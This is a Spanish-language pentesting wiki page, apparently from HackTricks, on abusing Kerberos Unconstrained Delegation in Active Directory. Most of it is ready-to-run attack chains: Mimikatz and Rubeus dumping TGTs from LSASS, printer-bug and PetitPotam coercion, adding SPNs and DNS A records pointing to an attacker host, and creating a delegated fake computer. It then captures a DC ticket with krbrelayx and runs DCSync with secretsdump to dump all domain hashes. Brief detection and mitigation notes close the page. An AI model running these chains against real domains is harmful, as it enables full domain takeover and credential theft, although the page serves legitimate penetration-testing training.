# Unconstrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Unconstrained Delegation

Esta es una característica que un Domain Administrator puede configurar en cualquier **Computer** dentro del dominio. Entonces, cada vez que un **user inicia sesión** en el Computer, una **copia del TGT** de ese usuario será **enviada dentro del TGS** proporcionado por el DC **y guardada en la memoria de LSASS**. Por lo tanto, si tienes privilegios de Administrator en la máquina, podrás **hacer dump de los tickets e impersonar a los usuarios** en cualquier máquina.

Por lo tanto, si un domain admin inicia sesión en un Computer con la característica "Unconstrained Delegation" activada, y tienes privilegios de local admin en esa máquina, podrás hacer dump del ticket e impersonar al Domain Admin en cualquier lugar (domain privesc).

Puedes **encontrar objetos Computer con este atributo** comprobando si el atributo [userAccountControl](<https://msdn.microsoft.com/en-us/library/ms680832(v=vs.85).aspx>) contiene [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>). Puedes hacerlo con un filtro LDAP de ‘(userAccountControl:1.2.840.113556.1.4.803:=524288)’, que es lo que hace powerview:
```bash
# List unconstrained computers
## Powerview
## A DCs always appear and might be useful to attack a DC from another compromised DC from a different domain (coercing the other DC to authenticate to it)
Get-DomainComputer –Unconstrained –Properties name
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

## ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))" --attributes samaccountname,dnshostname,operatingsystem

# Export tickets with Mimikatz
## Access LSASS memory
privilege::debug
sekurlsa::tickets /export #Recommended way
kerberos::list /export #Another way

# Monitor logins and export new tickets
## Doens't access LSASS memory directly, but uses Windows APIs
Rubeus.exe dump
Rubeus.exe monitor /interval:10 [/filteruser:<username>] #Check every 10s for new TGTs
```
Carga el ticket de Administrator (o del usuario víctima) en la memoria con **Mimikatz** o **Rubeus for a** [**Pass the Ticket**](pass-the-ticket.md)**.**\
Más información: [https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)\
[**Más información sobre Unconstrained delegation en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)<sup>[[2]](#references)[[3]](#references)</sup>

### **Force Authentication**

Si un atacante consigue **comprometer un equipo permitido para "Unconstrained Delegation"**, podría **engañar** a un **servidor de impresión** para que **inicie sesión automáticamente** contra él, **guardando un TGT** en la memoria del servidor.\
A continuación, el atacante podría realizar un **ataque Pass the Ticket para suplantar** la cuenta del equipo del servidor de impresión.

Para hacer que un servidor de impresión inicie sesión contra cualquier máquina, puedes usar [**SpoolSample**](https://github.com/leechristensen/SpoolSample):
```bash
.\SpoolSample.exe <printmachine> <unconstrinedmachine>
```
Si el TGT es de un domain controller, podrías realizar un [**DCSync attack**](acl-persistence-abuse/index.html#dcsync) y obtener todos los hashes del DC.\
[**Más información sobre este ataque en ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)<sup>[[10]](#references)</sup>

Encuentra aquí otras formas de **forzar una autenticación:**


{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

Cualquier otro coercion primitive que haga que la víctima se autentique con **Kerberos** en tu host con unconstrained-delegation también funciona. En entornos modernos, esto suele significar sustituir el flujo clásico de PrinterBug por **PetitPotam**, **DFSCoerce**, **ShadowCoerce**, **MS-EVEN** o coercion basado en **WebClient/WebDAV**, dependiendo de qué superficie RPC sea accesible.

### Abusar de una cuenta de usuario/servicio con unconstrained delegation

Unconstrained delegation **no está limitado a objetos de equipo**. Una **cuenta de usuario/servicio** también puede configurarse como `TRUSTED_FOR_DELEGATION`. En ese escenario, el requisito práctico es que la cuenta reciba service tickets de Kerberos para un **SPN que le pertenece**.

Esto da lugar a 2 rutas ofensivas muy comunes:

1. Comprometes la contraseña/hash de la **cuenta de usuario** con unconstrained-delegation y después **añades un SPN** a esa misma cuenta.
2. La cuenta ya tiene uno o más SPN, pero uno de ellos apunta a un **hostname obsoleto/dado de baja**; recrear el **registro DNS A** que falta es suficiente para secuestrar el flujo de autenticación sin modificar el conjunto de SPN.<sup>[[8]](#references)</sup>

Flujo mínimo en Linux:
```bash
# 1) Find unconstrained-delegation users and their SPNs
Get-DomainUser -LdapFilter '(userAccountControl:1.2.840.113556.1.4.803:=524288)' -Properties serviceprincipalname | ? {$_.serviceprincipalname}
findDelegation.py -target-domain <DOMAIN_FQDN> <DOMAIN>/<USER>:'<PASS>'

# 2) If needed, add a listener SPN to the compromised unconstrained user
python3 addspn.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-s 'HOST/kud-listener.<DOMAIN_FQDN>' --target-type samname <DC_IP>

# 3) Make the hostname resolve to your attacker box
python3 dnstool.py -u '<DOMAIN>\\svc_kud' -p '<PASS>' \
-r 'kud-listener.<DOMAIN_FQDN>' -a add -t A -d <ATTACKER_IP> <DC_IP>

# 4) Start krbrelayx with the unconstrained user's Kerberos material
#    For user accounts, the salt is usually UPPERCASE_REALM + samAccountName
python3 krbrelayx.py --krbsalt '<DOMAIN_FQDN_UPPERCASE>svc_kud' --krbpass '<PASS>' -dc-ip <DC_IP>

# 5) Coerce the DC/target server to authenticate to the SPN you own
python3 printerbug.py '<DOMAIN>/svc_kud:<PASS>'@<DC_FQDN> kud-listener.<DOMAIN_FQDN>
# Or swap the coercion primitive for PetitPotam / DFSCoerce / Coercer if needed

# 6) Reuse the captured ccache for DCSync or lateral movement
KRB5CCNAME=DC1\\$@<DOMAIN_FQDN>_krbtgt@<DOMAIN_FQDN>.ccache \
secretsdump.py -k -no-pass -just-dc <DOMAIN_FQDN>/ -dc-ip <DC_IP>
```
Notas:

- Esto resulta especialmente útil cuando el principal con **Unconstrained Delegation** es una **service account** y solo tienes sus credenciales, no ejecución de código en un host unido al dominio.
- Si el usuario objetivo ya tiene un **stale SPN**, recrear el **DNS record** correspondiente puede generar menos ruido que escribir un SPN nuevo en AD.
- El tradecraft reciente centrado en Linux utiliza `addspn.py`, `dnstool.py`, `krbrelayx.py` y una primitiva de coerción; no necesitas tocar un host Windows para completar la cadena.

### Abusing Unconstrained Delegation with an attacker-created computer

Los dominios modernos suelen tener `MachineAccountQuota > 0` (10 de forma predeterminada), lo que permite a cualquier principal autenticado crear hasta N objetos de equipo. Si además tienes el privilegio de token `SeEnableDelegationPrivilege` (o derechos equivalentes), puedes configurar el equipo recién creado para que sea de confianza para **Unconstrained Delegation** y capturar TGT entrantes de sistemas privilegiados.<sup>[[1]](#references)</sup>

Flujo de alto nivel:

1) Crea un equipo bajo tu control
```bash
# Impacket addcomputer.py (any authenticated user if MachineAccountQuota > 0)
addcomputer.py -computer-name <FAKEHOST> -computer-pass '<Strong.Passw0rd>' -dc-ip <DC_IP> <DOMAIN>/<USER>:'<PASS>'
```
2) Hacer que el nombre de host falso sea resoluble dentro del dominio
```bash
# krbrelayx dnstool.py - add an A record for the host FQDN to point to your listener IP
python3 dnstool.py -u '<DOMAIN>\\<FAKEHOST>$' -p '<Strong.Passw0rd>' \
--action add --record <FAKEHOST>.<DOMAIN_FQDN> --type A --data <ATTACKER_IP> \
-dns-ip <DC_IP> <DC_FQDN>
```
3) Activar Unconstrained Delegation en el equipo controlado por el atacante
```bash
# Requires SeEnableDelegationPrivilege (commonly held by domain admins or delegated admins)
# BloodyAD example
bloodyAD -d <DOMAIN_FQDN> -u <USER> -p '<PASS>' --host <DC_FQDN> add uac '<FAKEHOST>$' -f TRUSTED_FOR_DELEGATION
```
Por qué funciona: con unconstrained delegation, la LSA de un equipo con delegation habilitada almacena en caché los TGTs entrantes. Si engañas a un DC o a un servidor privilegiado para que se autentique en tu host falso, su TGT de máquina se almacenará y podrá exportarse.

4) Inicia krbrelayx en modo de exportación y prepara el material de Kerberos
```bash
# Older labs often use RC4/NT hashes, but modern domains frequently negotiate AES for machine accounts.
# Prefer supplying the AES key directly, or derive it from the known password+salt if needed.
python3 krbrelayx.py --aesKey <AES256_KEY> -dc-ip <DC_IP>

# Alternative if you know the password and correct Kerberos salt:
python3 krbrelayx.py --krbpass '<Strong.Passw0rd>' --krbsalt '<CASE_SENSITIVE_SALT>' -dc-ip <DC_IP>
```
5) Coaccionar la autenticación del DC/servidores hacia tu host falso
```bash
# netexec (CME fork) coerce_plus module supports multiple coercion vectors
# Common options: METHOD=PrinterBug|PetitPotam|DFSCoerce|MSEven
netexec smb <DC_FQDN> -u '<FAKEHOST>$' -p '<Strong.Passw0rd>' -M coerce_plus -o LISTENER=<FAKEHOST>.<DOMAIN_FQDN> METHOD=PrinterBug
```
krbrelayx guardará archivos ccache cuando una máquina se autentique, por ejemplo:
```
Got ticket for DC1$@DOMAIN.TLD [krbtgt@DOMAIN.TLD]
Saving ticket in DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache
```
6) Usa el TGT de la máquina DC capturado para realizar DCSync
```bash
# Create a krb5.conf for the realm (netexec helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# Use the saved ccache to DCSync (netexec helper)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
netexec smb <DC_FQDN> --use-kcache --ntds

# Alternatively with Impacket (Kerberos from ccache)
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```
- `MachineAccountQuota > 0` permite la creación de equipos por usuarios sin privilegios; de lo contrario, se necesitan permisos explícitos.
- Establecer `TRUSTED_FOR_DELEGATION` en un equipo requiere `SeEnableDelegationPrivilege` (o permisos de domain admin).
- Asegúrate de que la resolución de nombres apunte a tu host falso (registro A de DNS) para que el DC pueda acceder a él mediante su FQDN.
- La coerción requiere un vector viable (PrinterBug/MS-RPRN, EFSRPC/PetitPotam, DFSCoerce, MS-EVEN, etc.). Deshabilítalos en los DC siempre que sea posible.
- Si la cuenta víctima está marcada como **"Account is sensitive and cannot be delegated"** o es miembro de **Protected Users**, el TGT reenviado no se incluirá en el service ticket, por lo que esta cadena no producirá un TGT reutilizable.<sup>[[9]](#references)</sup>
- Si **Credential Guard** está habilitado en el cliente/servidor que realiza la autenticación, Windows bloquea **Kerberos unconstrained delegation**, lo que puede hacer que, desde la perspectiva del operador, fallen rutas de coerción que de otro modo serían válidas.

Ideas de detección y hardening:

- Genera alertas para los eventos 4741 (cuenta de equipo creada) y 4742/4738 (cuenta de equipo/usuario modificada) cuando se establezca el UAC `TRUSTED_FOR_DELEGATION`.
- Supervisa adiciones inusuales de registros A de DNS en la zona del dominio.
- Busca picos de eventos 4768/4769 desde hosts inesperados y autenticaciones de los DC contra hosts que no sean DC.
- Restringe `SeEnableDelegationPrivilege` a un conjunto mínimo, establece `MachineAccountQuota=0` cuando sea viable y deshabilita Print Spooler en los DC. Aplica la firma LDAP y el channel binding.

### Mitigación

- Limita los inicios de sesión de DA/Admin a servicios específicos.
- Establece **"Account is sensitive and cannot be delegated"** para las cuentas con privilegios.

## Referencias

- [1] [HTB: Delegate — credenciales de SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync a DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
- [2] [harmj0y – S4U2Pwnage](https://www.harmj0y.net/blog/activedirectory/s4u2pwnage/)
- [3] [ired.team – Compromiso del dominio mediante unrestricted delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-unrestricted-kerberos-delegation)
- [4] [krbrelayx](https://github.com/dirkjanm/krbrelayx)
- [5] [Impacket addcomputer.py](https://github.com/fortra/impacket)
- [6] [BloodyAD](https://github.com/CravateRouge/bloodyAD)
- [7] [netexec (fork de CME)](https://github.com/Pennyw0rth/NetExec)
- [8] [Praetorian – Unconstrained Delegation en Active Directory](https://www.praetorian.com/blog/unconstrained-delegation-active-directory/)
- [9] [Microsoft Learn – Protected Users Security Group](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)
- [10] [ired.team – Compromiso del dominio mediante un servidor de impresión del DC y Kerberos delegation](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/domain-compromise-via-dc-print-server-and-kerberos-delegation)

{{#include ../../banners/hacktricks-training.md}}
